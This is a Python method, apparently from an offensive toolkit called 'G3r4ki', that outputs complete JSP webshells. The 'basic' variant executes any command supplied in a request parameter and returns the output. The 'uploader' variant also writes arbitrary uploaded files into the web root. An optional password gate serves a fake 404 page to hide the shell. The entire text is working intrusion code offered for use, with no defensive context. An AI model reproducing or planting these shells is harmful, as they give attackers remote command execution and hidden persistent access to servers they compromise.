    def generate_jsp_shell(self, variant: str = "basic", password: Optional[str] = None) -> str:
        """
        Generate JSP webshell
        
        Args:
            variant: Shell variant
            password: Optional password for protected shells
            
        Returns:
            Webshell code
            
        Raises:
            ValueError: If variant is unknown
        """
        if variant not in self.available_shells["jsp"]:
            variant = "basic"
            logger.warning(f"Unknown JSP shell variant, using {variant}")
        
        result_shell = ""
        if variant == "basic":
            result_shell = """<%@ page import="java.io.*" %>
<%@ page import="java.util.*" %>
<%@ page import="java.net.*" %>

<html>
<head>
    <title>G3r4ki JSP Shell</title>
    <style>
        body { font-family: monospace; background-color: #f0f0f0; margin: 20px; }
        h1 { color: #333; }
        form { margin-bottom: 20px; }
        input[type=text] { width: 70%; padding: 8px; margin-right: 10px; }
        input[type=submit] { padding: 8px 15px; background-color: #4CAF50; color: white; border: none; }
        pre { background-color: #fff; padding: 10px; border: 1px solid #ddd; }
    </style>
</head>
<body>
    <h1>G3r4ki JSP Shell</h1>
    <form method="post">
        <input type="text" name="cmd" value="<%= (request.getParameter("cmd") != null) ? request.getParameter("cmd") : "" %>" placeholder="Enter command..." autofocus>
        <input type="submit" value="Execute">
    </form>
    
    <hr>
    <h3>Command Output</h3>
    <pre>
<%
    if (request.getParameter("cmd") != null) {
        String cmd = request.getParameter("cmd");
        try {
            Process p = Runtime.getRuntime().exec(cmd);
            InputStream is = p.getInputStream();
            BufferedReader br = new BufferedReader(new InputStreamReader(is));
            String line;
            
            while ((line = br.readLine()) != null) {
                out.println(line);
            }
            
            br.close();
            
            // Also capture error output
            is = p.getErrorStream();
            br = new BufferedReader(new InputStreamReader(is));
            
            while ((line = br.readLine()) != null) {
                out.println(line);
            }
            
            br.close();
        } catch (Exception e) {
            out.println("Error executing command: " + e.getMessage());
        }
    }
%>
    </pre>
    
    <hr>
    <h3>System Information</h3>
    <pre>
    OS: <%= System.getProperty("os.name") %> <%= System.getProperty("os.version") %> <%= System.getProperty("os.arch") %>
    Java Version: <%= System.getProperty("java.version") %>
    User: <%= System.getProperty("user.name") %>
    Current Directory: <%= new File(".").getAbsolutePath() %>
    </pre>
</body>
</html>"""
            
        elif variant == "uploader":
            result_shell = """<%@ page import="java.io.*" %>
<%@ page import="java.util.*" %>
<%@ page import="java.net.*" %>
<%@ page import="java.nio.file.*" %>
<%@ page import="org.apache.commons.fileupload.*" %>
<%@ page import="org.apache.commons.fileupload.disk.*" %>
<%@ page import="org.apache.commons.fileupload.servlet.*" %>

<%
String uploadStatus = "";
String cmdOutput = "";

// Execute command if present
if (request.getParameter("cmd") != null) {
    String cmd = request.getParameter("cmd");
    try {
        Process p = Runtime.getRuntime().exec(cmd);
        InputStream is = p.getInputStream();
        BufferedReader br = new BufferedReader(new InputStreamReader(is));
        StringBuilder output = new StringBuilder();
        String line;
        
        while ((line = br.readLine()) != null) {
            output.append(line).append("\\n");
        }
        
        br.close();
        
        // Also capture error output
        is = p.getErrorStream();
        br = new BufferedReader(new InputStreamReader(is));
        
        while ((line = br.readLine()) != null) {
            output.append(line).append("\\n");
        }
        
        br.close();
        cmdOutput = output.toString();
    } catch (Exception e) {
        cmdOutput = "Error executing command: " + e.getMessage();
    }
}

// Handle file upload
boolean isMultipart = ServletFileUpload.isMultipartContent(request);
if (isMultipart) {
    try {
        DiskFileItemFactory factory = new DiskFileItemFactory();
        factory.setSizeThreshold(1024 * 1024); // 1MB
        
        File tempDir = (File) application.getAttribute("javax.servlet.context.tempdir");
        factory.setRepository(tempDir);
        
        ServletFileUpload upload = new ServletFileUpload(factory);
        upload.setSizeMax(10 * 1024 * 1024); // 10MB
        
        List<FileItem> items = upload.parseRequest(request);
        
        for (FileItem item : items) {
            if (!item.isFormField()) {
                String fileName = item.getName();
                if (fileName != null && !fileName.isEmpty()) {
                    File uploadedFile = new File(application.getRealPath("/") + fileName);
                    item.write(uploadedFile);
                    uploadStatus = "File uploaded successfully to: " + uploadedFile.getAbsolutePath();
                }
            }
        }
    } catch (Exception e) {
        uploadStatus = "Error uploading file: " + e.getMessage();
    }
}
%>

<html>
<head>
    <title>G3r4ki JSP Upload Shell</title>
    <style>
        body { font-family: monospace; background-color: #f0f0f0; margin: 20px; }
        h1, h2 { color: #333; }
        form { margin-bottom: 20px; }
        input[type=text] { width: 70%; padding: 8px; margin-right: 10px; }
        input[type=submit], input[type=file] { padding: 8px 15px; margin: 5px 0; }
        input[type=submit] { background-color: #4CAF50; color: white; border: none; }
        pre { background-color: #fff; padding: 10px; border: 1px solid #ddd; white-space: pre-wrap; }
        .section { margin: 20px 0; padding: 15px; background-color: #fff; border: 1px solid #ddd; }
    </style>
</head>
<body>
    <h1>G3r4ki JSP Upload Shell</h1>
    
    <div class="section">
        <h2>Command Execution</h2>
        <form method="post">
            <input type="text" name="cmd" value="<%= (request.getParameter("cmd") != null) ? request.getParameter("cmd") : "" %>" placeholder="Enter command...">
            <input type="submit" value="Execute">
        </form>
        <% if (!cmdOutput.isEmpty()) { %>
            <h3>Output:</h3>
            <pre><%= cmdOutput %></pre>
        <% } %>
    </div>
    
    <div class="section">
        <h2>File Upload</h2>
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="file">
            <input type="submit" value="Upload">
        </form>
        <% if (!uploadStatus.isEmpty()) { %>
            <p><%= uploadStatus %></p>
        <% } %>
    </div>
    
    <div class="section">
        <h2>System Information</h2>
        <pre>
    OS: <%= System.getProperty("os.name") %> <%= System.getProperty("os.version") %> <%= System.getProperty("os.arch") %>
    Java Version: <%= System.getProperty("java.version") %>
    User: <%= System.getProperty("user.name") %>
    Current Directory: <%= new File(".").getAbsolutePath() %>
    Server Info: <%= application.getServerInfo() %>
        </pre>
    </div>
</body>
</html>"""
        
        # Add password protection if requested
        if password:
            passwd_check = f"""<%
    if (request.getParameter("p") == null || !request.getParameter("p").equals("{password}")) {{
        response.setStatus(404);
        out.println("<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>");
        return;
    }}
%>
"""
            # Insert password check at the beginning (after imports)
            if "<%@" in result_shell:
                last_import_index = result_shell.rfind("<%@ page")
                last_import_end = result_shell.find("%>", last_import_index) + 2
                result_shell = result_shell[:last_import_end] + "\n" + passwd_check + result_shell[last_import_end:]
            else:
                result_shell = passwd_check + result_shell
        
        return result_shell